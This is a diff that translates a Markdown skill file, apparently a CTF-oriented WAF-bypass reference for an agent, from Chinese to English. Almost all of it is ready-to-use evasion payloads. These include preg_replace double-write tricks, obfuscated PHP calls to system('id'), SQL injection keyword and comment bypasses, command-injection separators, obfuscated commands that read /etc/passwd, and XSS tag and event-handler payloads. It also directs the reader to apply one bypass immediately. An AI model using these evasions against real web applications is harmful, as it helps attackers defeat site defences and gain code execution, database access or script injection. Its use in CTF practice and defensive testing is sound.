@@ -1,89 +1,89 @@
 ---
 name: waf-bypass
-description: WAF 绕过技巧库 — 各类WAF绕过方法
+description: WAF bypass techniques reference — methods for bypassing various WAF types
 ---
 
-# WAF 绕过技巧库
+# WAF Bypass Techniques Reference
 
-## PHP WAF 绕过
+## PHP WAF Bypass
 
-### preg_replace 双写绕过（关键技巧）
+### preg_replace Double-Write Bypass (Key Technique)
 
-`preg_replace()` 会**循环替换**直到没有匹配为止，但如果关键词被替换后**拼出了新的关键词**，只会替换内层，外层保留。
+`preg_replace()` performs **iterative replacement** until no matches remain, but if the keyword is reconstructed **after replacement**, only the inner layer is replaced while the outer layer remains.
 
-**核心原理**：`preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → 删除中间的 `NSSCTF` → 剩下 `NSS` + `CTF` = `NSSCTF`
+**Core Principle**: `preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → deletes middle `NSSCTF` → leaves `NSS` + `CTF` = `NSSCTF`
 
-**通用模板**：
+**General Template**:
 ```
-假设过滤关键词为 X（如 NSSCTF）
-构造输入: X拆成两半, 在中间嵌入完整X
-即: X前半 + X + X后半
+Assume filtered keyword is X (e.g., NSSCTF)
+Construct input: X split in half, embed complete X in middle
+i.e.: X_first_half + X + X_second_half
 
-示例:
-过滤 NSSCTF → 输入 NSS + NSSCTF + CTF = NSSNSSCTFCTF
-过滤 flag   → 输入 fl + flag + ag = flflagag
-过滤 cat    → 输入 ca + cat + t = cacatt
-过滤 system → 输入 sys + system + tem = syssystemtem
+Examples:
+Filter NSSCTF → input NSS + NSSCTF + CTF = NSSNSSCTFCTF
+Filter flag   → input fl + flag + ag = flflagag
+Filter cat    → input ca + cat + t = cacatt
+Filter system → input sys + system + tem = syssystemtem
 ```
 
-**为什么简单的大小写绕过不适用于 preg_replace**：
-- `preg_replace('/NSSCTF/', '', 'NssCTF')` → `Nss` 不匹配 `NSS`（无 i 修饰符）→ 原样输出 `NssCTF`
-- `NssCTF !== "NSSCTF"`（严格比较失败）→ 不通过
-- 只有双写绕过才能让替换后**恰好得到原始关键词字符串**
+**Why simple case-mixing doesn't work for preg_replace**:
+- `preg_replace('/NSSCTF/', '', 'NssCTF')` → `Nss` doesn't match `NSS` (no i flag) → outputs `NssCTF` unchanged
+- `NssCTF !== "NSSCTF"` (strict comparison fails) → bypass fails
+- Only double-write bypass can reconstruct the **exact original keyword string** after replacement
 
-**⚠️ 识别场景**：
-- 源码含 `preg_replace('/关键词/', '', $input)` 且需要 `$input` 替换后**等于关键词本身** → 立即用双写绕过
-- 不要尝试大小写绕过（替换后不等于原关键词）或编码绕过（编码字符串不等于原关键词）
+**⚠️ Detection Scenario**:
+- Source contains `preg_replace('/keyword/', '', $input)` and `$input` must equal the keyword **after replacement** → immediately use double-write bypass
+- Don't attempt case-mixing (post-replacement ≠ original keyword) or encoding bypass (encoded string ≠ original keyword)
 
-### 函数名混淆
-- Base64 编码恢复：`$f=base64_decode('c3lzdGVt');$f('id');`
-- 字符串拼接：`$f='sys'.'tem';$f('id');`
-- 可变函数：`$a='sys';$b='tem';$a$b('id');`
+### Function Name Obfuscation
+- Base64 decode restoration: `$f=base64_decode('c3lzdGVt');$f('id');`
+- String concatenation: `$f='sys'.'tem';$f('id');`
+- Variable functions: `$a='sys';$b='tem';$a$b('id');`
 
-### 关键字绕过
-- 拆分路径：`'/va'.'r/ww'.'w/ht'.'ml'`
-- 注释绕过：`sys/**/tem('id');`
-- 反转字符串：`$f=strrev('metsys');$f('id');`
+### Keyword Bypass
+- Path splitting: `'/va'.'r/ww'.'w/ht'.'ml'`
+- Comment bypass: `sys/**/tem('id');`
+- String reversal: `$f=strrev('metsys');$f('id');`
 
-## SQL 注入绕过
+## SQL Injection Bypass
 
-### 关键字绕过
-- 大小写混合：`SeLeCt` 代替 `SELECT`
-- 内联注释：`S/*!ELECT*/`
-- 双重编码：`%2565` → `%65` → `e`
-- 等价函数：`GROUP_CONCAT` 替代 `concat_ws`
+### Keyword Bypass
+- Case mixing: `SeLeCt` instead of `SELECT`
+- Inline comments: `S/*!ELECT*/`
+- Double encoding: `%2565` → `%65` → `e`
+- Equivalent functions: `GROUP_CONCAT` instead of `concat_ws`
 
-### 注释符变体
-- `-- -` 代替 `--`
-- `--+` 代替 `-- `
-- `#` 代替 `--`
+### Comment Variants
+- `-- -` instead of `--`
+- `--+` instead of `-- `
+- `#` instead of `--`
 
-## 命令注入绕过
+## Command Injection Bypass
 
-### 分隔符变体
-- 换行符：`id\nwhoami`
-- 管道符：`id|whoami`
-- 逻辑运算：`id&&whoami`
-- 子 shell：`$(id)` 或 `` `id` ``
+### Separator Variants
+- Newline: `id\nwhoami`
+- Pipe: `id|whoami`
+- Logical AND: `id&&whoami`
+- Subshell: `$(id)` or `` `id` ``
 
-### 命令混淆
-- 变量拼接：`a=i;b=d;$a$b`
-- 通配符：`/bin/ca? /etc/pas?d`
-- 空变量：`c'a't /etc/passwd`
-- 转义：`c\at /etc/passwd`
+### Command Obfuscation
+- Variable concatenation: `a=i;b=d;$a$b`
+- Wildcards: `/bin/ca? /etc/pas?d`
+- Empty variable: `c'a't /etc/passwd`
+- Escape: `c\at /etc/passwd`
 
-## XSS 绕过
+## XSS Bypass
 
-### 标签变体
+### Tag Variants
 - `<img src=x onerror=alert(1)>`
 - `<svg onload=alert(1)>`
 - `<body onload=alert(1)>`
 - `<input onfocus=alert(1) autofocus>`
 
-### 事件处理器
+### Event Handlers
 - `onerror`, `onload`, `onclick`, `onfocus`, `onmouseover`
 
-### 编码绕过
-- HTML 实体编码
-- Unicode 编码
-- Base64 编码（配合 eval）
+### Encoding Bypass
+- HTML entity encoding
+- Unicode encoding
+- Base64 encoding (with eval)
